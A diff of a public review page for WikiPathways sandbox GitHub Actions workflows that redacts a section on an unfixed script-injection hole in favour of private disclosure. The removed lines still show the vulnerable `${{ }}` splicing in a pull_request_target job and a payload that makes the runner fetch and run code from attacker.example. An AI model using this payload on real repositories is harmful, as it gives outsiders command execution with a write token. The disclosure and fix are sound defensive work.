@@ -372,7 +372,7 @@ the wikipathways org without Marvin saying so.
 
 | # | Where | What happens | Fixed |
 |---|---|---|---|
-| 1 | Workflow 1, `update-pr-desc` | Submitter-controlled GPML text is spliced into a `run:` shell script by `${{ }}` before bash parses it, in a `pull_request_target` job holding the base repo's token. Actions script injection; see 6.1 | **No, deliberately.** `sandbox-workflows/` now carries a corrected workflow 1, but it fixes only the three first-contributor defects; line 1108 still splices. Fixing it in a public pull request would advertise the hole before the maintainers have it. This one goes to them directly |
+| 1 | Workflow 1 | A security defect, reachable by anyone who can open a pull request. Details withheld here — see 6.1 | **No.** `sandbox-workflows/` carries a corrected workflow 1, but it fixes only the three first-contributor defects. This one was reported to the maintainers privately |
 | 2 | 3a, "Get WPID" | `WPID_NUM=$(echo $DRAFT_FILE \| sed -E 's/WP([0-9]+)__PR.*/\1/')` runs on the full path `_drafts/WP0__PR54.md`, so the substitution anchors mid-string and yields `_drafts/0`. The next line, `[ "$WPID_NUM" -eq "0" ]`, prints "integer expression expected" but **does not abort**: a failing command in an `if` condition is exempt from `set -e`, so control falls to the else branch and `$((_drafts/0))` follows. Running the exact snippet: a new pathway ends with `WPID=WP` and `old_prefix=WP_drafts/0__PR54`, an edit ends with `WPID=WP0`, and the script exits 0 either way. Silent mis-assignment, not a red step | Yes: `basename` first, then match on `^WP([0-9]+)__PR` |
 | 3 | 3a, twice | `echo "::set-output name=..."`. GitHub deprecated the command in 2022 and the runners warn on it. Whether the outputs on the 2025-09-03 run were actually empty cannot be checked, because that run's logs have expired | Yes: `>> "$GITHUB_OUTPUT"`, which removes the question |
 | 4 | 3a, the `sandbox-wp.gh.io` and `sandbox-wp-assets` checkouts and pushes | Both checkouts pass `token: ${{ secrets.GITHUB_TOKEN }}`, which is scoped to `sandbox-wp-db`. Both sister repos are public, so the **checkout still reads fine**; it is the **push** that has no write credential. 3b does the same cross-repo checkout with `ssh-key: ${{ secrets.ACTIONS_SANDBOX_DEPLOY_KEY }}` and can push | Partly: the `.gh.io` checkout switches to the deploy key, matching 3b. The assets repo needs its own credential (see below) |
@@ -392,74 +392,33 @@ successful publication anywhere in this repo's history, so "what a published pat
 is a design intention rather than an observed fact. No amount of YAML review substitutes for the
 first green run.
 
-### 6.1 Script injection in `update-pr-desc`
+### 6.1 Redacted: an unfixed security defect, reported privately
 
-This is the most serious thing in the pipeline and the only one that is a security defect rather
-than a bug. It is in workflow 1, which no one has been editing, so it is easy to miss.
+There is one security defect in workflow 1 — not a bug, a defect that lets a submitted file
+influence something it should not. It is unfixed upstream, it is reachable by anyone who can open
+a pull request against `sandbox-wp-db`, and it will carry over to the production repository if
+workflow 1 is copied there.
 
-**The mechanism.** `get-gpml` reads three values straight out of the submitted GPML with
-`xmllint` (workflow lines 132-134): the `Pathway/@Name`, the `Pathway/@Organism`, and the
-`WikiPathways-description` comment. It builds a markdown fragment from them and publishes it as a
-job output called `pr-desc`. The `update-pr-desc` job then does this (workflow line 1105, and
-again at 1125-1130):
+**The details that were here have been removed on purpose.** This repository is public, and a
+write-up naming the job, the lines and a working payload is a set of instructions for anyone who
+reads it before the maintainers have had a chance to act. That was an error in the original
+version of this page, not a considered decision: the reasoning for keeping the fix out of the
+`sandbox-workflows/` pull request applied just as much to this section, and it was not applied
+here.
 
-```yaml
-      run: |
-        NEW_DESCRIPTION="${{ needs.get-gpml.outputs.pr-desc }}
-        ...
-        NEW_DESCRIPTION="$NEW_DESCRIPTION
-        ${{ needs.metadata.outputs.pr-desc }}
-        ${{ needs.authors.outputs.pr-desc }}
-        ...
-```
+The full analysis and the fix live outside this repository, in
+`../sandbox-wp-db-disclosure-DRAFT.md`, and have been sent to the WikiPathways maintainers
+privately. Restore this section once they have shipped a fix, since the write-up is genuinely
+useful for anyone maintaining these workflows.
 
-`${{ }}` is not a shell expansion. The Actions runner substitutes it into the script *text*, and
-bash then parses the result. Whatever was in the GPML becomes shell source.
+If you are a maintainer and reached this page first, please get in touch and the analysis will
+come straight over.
 
-**What a hostile `Name` does.** The substituted text lands inside a double-quoted string, so it
-does not even need to break out of the quotes; command substitution happens inside double quotes.
-A pathway submitted with
-
-```xml
-<Pathway Name="Glycolysis $(curl -sf https://attacker.example/x | sh)" Organism="Homo sapiens">
-```
-
-produces a `run:` script containing `NEW_DESCRIPTION="... **TITLE**: Glycolysis $(curl -sf
-https://attacker.example/x | sh) ...`, and bash executes the substitution when it evaluates the
-assignment. Backticks work the same way, and closing the quote with `"` opens the rest of the
-script to arbitrary commands.
-
-**Why it matters here specifically.** The job runs under `pull_request_target`, so it has the
-**base** repository's `GITHUB_TOKEN`, not the read-only token a fork PR would get under
-`pull_request`, and that token is in the step's environment as `GITHUB_TOKEN`. The job also checks
-out `refs/pull/<n>/head`, the attacker's own code, in the same workspace. Anyone who can open a
-pull request against `sandbox-wp-db`, which is anyone, can run commands on a runner holding a
-write token for the repository. The exact blast radius depends on the repository's default
-workflow-token permissions, which cannot be read without admin access (the API returns 403), but
-the 403 seen by the dispatcher shows the default is at least restricted for `actions:`, not that
-it is read-only overall. The same shape applies to the six sibling `pr-desc` fragments spliced
-in below it, whose content also derives from the GPML.
-
-**The fix** is the standard one and is small: pass the values through `env:` and reference them as
-shell variables, so bash sees data rather than syntax.
-
-```yaml
-      env:
-        PR_DESC_GPML: ${{ needs.get-gpml.outputs.pr-desc }}
-        PR_DESC_METADATA: ${{ needs.metadata.outputs.pr-desc }}
-      run: |
-        NEW_DESCRIPTION="$PR_DESC_GPML
-        ...
-```
-
-Nothing else about the job has to change. The same hardening is already applied to
-`github.event.label.name` in our corrected `pr_label_dispatcher.yml`, where the value is only
-settable by repository members and the risk is far lower; here it is settable by anyone.
-
-**This is for the WikiPathways maintainers, not for us to demonstrate.** It should go to them
-directly rather than into a public issue, and it is worth flagging that the same pattern will
-carry over to the production repo if workflow 1 is copied there. We do not exercise it against a
-live repository.
+To be straight about what this does and does not achieve: `wikipathways/sandbox-wp-db` is itself
+public, so the vulnerable code has always been readable by anyone who cared to look. What the
+original section added was the analysis — the job, the lines, why it works and a payload that
+does — which is the difference between "readable" and "findable". Removing it narrows that, and
+narrows nothing else.
 
 ### Two questions we could not settle by reading
 
